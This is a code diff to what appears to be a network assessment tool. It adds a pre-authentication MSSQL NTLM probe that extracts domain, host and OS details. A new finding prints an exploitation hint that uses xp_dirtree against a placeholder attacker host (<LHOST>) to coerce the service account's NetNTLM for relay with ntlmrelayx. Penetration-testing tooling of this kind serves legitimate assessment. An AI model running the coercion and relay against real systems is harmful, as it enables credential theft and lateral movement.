@@ -172,6 +172,107 @@ def prelogin(ip: str, port: int = _DEFAULT_PORT, timeout: float = 4.0) -> dict:
     return _parse_prelogin(data)
 
 
+# --- pre-auth NTLM info leak (native TDS, no credentials) ------------------------
+
+_AV_TYPES = {0x0001: "nb_computer", 0x0002: "nb_domain", 0x0003: "dns_computer",
+             0x0004: "dns_domain", 0x0005: "dns_tree"}
+
+
+def _parse_av_pairs(target_info: bytes) -> dict:
+    """Parse an NTLM CHALLENGE target-info block (AV_PAIRs) into {nb_domain,
+    nb_computer, dns_domain, dns_computer, dns_tree}. Values are UTF-16LE."""
+    out: dict = {}
+    i = 0
+    n = len(target_info)
+    while i + 4 <= n:
+        av_id, av_len = struct.unpack_from("<HH", target_info, i)
+        i += 4
+        if av_id == 0x0000:                       # MsvAvEOL
+            break
+        if i + av_len > n:
+            break
+        if av_id in _AV_TYPES:
+            out[_AV_TYPES[av_id]] = target_info[i:i + av_len].decode("utf-16-le", "replace")
+        i += av_len
+    return out
+
+
+def _build_login7_ntlm(sspi: bytes, hostname: str = "recce", appname: str = "recce") -> bytes:
+    """A TDS7 LOGIN7 packet requesting integrated (SSPI) auth, carrying an NTLM Type-1
+    in the SSPI field - so the server replies with its NTLM Type-2 challenge."""
+    host = hostname.encode("utf-16-le")
+    app = appname.encode("utf-16-le")
+    fixed_len = 94                                # 36-byte fixed header + 58-byte OL block
+    ib_host = fixed_len
+    ib_app = ib_host + len(host)
+    ib_sspi = ib_app + len(app)
+    data = host + app + sspi
+    total = fixed_len + len(data)
+
+    fixed = (struct.pack("<I", total)             # Length
+             + struct.pack("<I", 0x74000004)      # TDSVersion 7.4
+             + struct.pack("<I", 4096)            # PacketSize
+             + struct.pack("<I", 7)               # ClientProgVer
+             + struct.pack("<I", 0)               # ClientPID
+             + struct.pack("<I", 0)               # ConnectionID
+             + bytes([0x00, 0x80, 0x00, 0x00])    # OptFlags1, OptFlags2(fIntSecurity), Type, Flags3
+             + struct.pack("<i", 0)               # ClientTimeZone
+             + struct.pack("<I", 0))              # ClientLCID
+    ol = (struct.pack("<HH", ib_host, len(hostname))       # HostName (cch = chars)
+          + struct.pack("<HH", fixed_len, 0)               # UserName (empty)
+          + struct.pack("<HH", fixed_len, 0)               # Password (empty)
+          + struct.pack("<HH", ib_app, len(appname))       # AppName
+          + struct.pack("<HH", fixed_len, 0)               # ServerName
+          + struct.pack("<HH", fixed_len, 0)               # Unused/Extension
+          + struct.pack("<HH", fixed_len, 0)               # CltIntName
+          + struct.pack("<HH", fixed_len, 0)               # Language
+          + struct.pack("<HH", fixed_len, 0)               # Database
+          + b"\x00" * 6                                    # ClientID (MAC)
+          + struct.pack("<HH", ib_sspi, len(sspi))         # SSPI
+          + struct.pack("<HH", fixed_len, 0)               # AtchDBFile
+          + struct.pack("<HH", fixed_len, 0)               # ChangePassword
+          + struct.pack("<I", 0))                          # cbSSPILong
+    body = fixed + ol + data
+    return struct.pack(">BBHHBB", 0x10, 0x01, 8 + len(body), 0, 0, 0) + body
+
+
+def ntlm_info(ip: str, port: int = _DEFAULT_PORT, timeout: float = 4.0) -> dict:
+    """Native pre-auth NTLM info leak: drive a TDS integrated-auth login with an NTLM
+    Type-1 and parse the server's Type-2 challenge for its NetBIOS/DNS domain + host
+    and OS version. No credentials sent (we never complete the auth). Returns {} on any
+    failure. Mirrors nmap's ms-sql-ntlm-info without needing nmap."""
+    from . import ntlm
+    try:
+        with socket.create_connection((ip, port), timeout=timeout) as s:
+            s.settimeout(timeout)
+            s.sendall(_build_prelogin())
+            s.recv(4096)                          # drain the PRELOGIN response
+            s.sendall(_build_login7_ntlm(ntlm.type1()))
+            # Read one TDS response packet (8-byte header carries the total length).
+            hdr = s.recv(8)
+            if len(hdr) < 8:
+                return {}
+            length = struct.unpack(">H", hdr[2:4])[0]
+            resp = hdr
+            while len(resp) < length and len(resp) < 65536:
+                chunk = s.recv(4096)
+                if not chunk:
+                    break
+                resp += chunk
+    except OSError:
+        return {}
+    t2 = ntlm.parse_type2(resp)
+    if not t2:
+        return {}
+    out = _parse_av_pairs(t2.get("target_info", b""))
+    # OS version (8-byte Version field at offset 48 of the CHALLENGE, if present).
+    idx = resp.find(b"NTLMSSP\x00")
+    if idx >= 0 and len(resp) >= idx + 56 and (t2.get("flags", 0) & 0x02000000):
+        v = resp[idx + 48:idx + 56]
+        out["os_version"] = f"{v[0]}.{v[1]}.{struct.unpack('<H', v[2:4])[0]}"
+    return out
+
+
 # --- target discovery -----------------------------------------------------------
 
 def mssql_targets(hosts: list[Host]) -> list[dict]:
@@ -194,9 +295,10 @@ def probe_target(ip: str, port: int = _DEFAULT_PORT, active: bool = True,
     `instances` may be passed pre-computed to avoid re-running the SQL Browser (UDP
     1434) query per port when one host exposes several MSSQL ports."""
     if not active:
-        return {"instances": [], "prelogin": {}}
+        return {"instances": [], "prelogin": {}, "ntlm": {}}
     inst = sql_browser(ip) if instances is None else instances
-    return {"instances": inst, "prelogin": prelogin(ip, port)}
+    return {"instances": inst, "prelogin": prelogin(ip, port),
+            "ntlm": ntlm_info(ip, port)}
 
 
 # --- credential substitution ----------------------------------------------------
@@ -510,8 +612,29 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Disable xp_cmdshell; run SQL under a low-privilege gMSA.",
                     ["CWE-250"], kind="xp_cmdshell"))
 
-            # Pre-auth NTLM / host / domain disclosure (relay/coercion target).
-            if "ms-sql-ntlm-info" in scripts:
+            # Pre-auth NTLM / host / domain disclosure (relay/coercion target). Prefer
+            # recce's native TDS NTLM leak (airgap, no nmap); fall back to the NSE script.
+            nt = (probes.get(tgt) or {}).get("ntlm") or {}
+            if nt:
+                bits = []
+                if nt.get("nb_domain"):
+                    bits.append(f"NetBIOS domain {nt['nb_domain']}")
+                if nt.get("dns_computer"):
+                    bits.append(f"FQDN {nt['dns_computer']}")
+                if nt.get("dns_domain"):
+                    bits.append(f"DNS domain {nt['dns_domain']}")
+                if nt.get("os_version"):
+                    bits.append(f"OS {nt['os_version']}")
+                out.append(_finding(
+                    "low", "MSSQL discloses NetBIOS / domain / FQDN pre-auth (NTLM)",
+                    tgt, "The TDS integrated-auth handshake leaks host identity with no "
+                    "credential: " + "; ".join(bits) + ".",
+                    "manual / ntlmrelayx",
+                    _fill("EXEC xp_dirtree '\\\\<LHOST>\\x';  # once logged in, coerce the "
+                          "service account's NetNTLM -> relay (impacket-ntlmrelayx)", ctx),
+                    "Restrict exposure; require SMB signing + EPA to blunt relay.",
+                    ["CWE-200"], kind="ntlm_disclosure"))
+            elif "ms-sql-ntlm-info" in scripts:
                 out.append(_finding(
                     "low", "MSSQL discloses NetBIOS / domain / FQDN pre-auth",
                     tgt, scripts["ms-sql-ntlm-info"].strip()[:200],
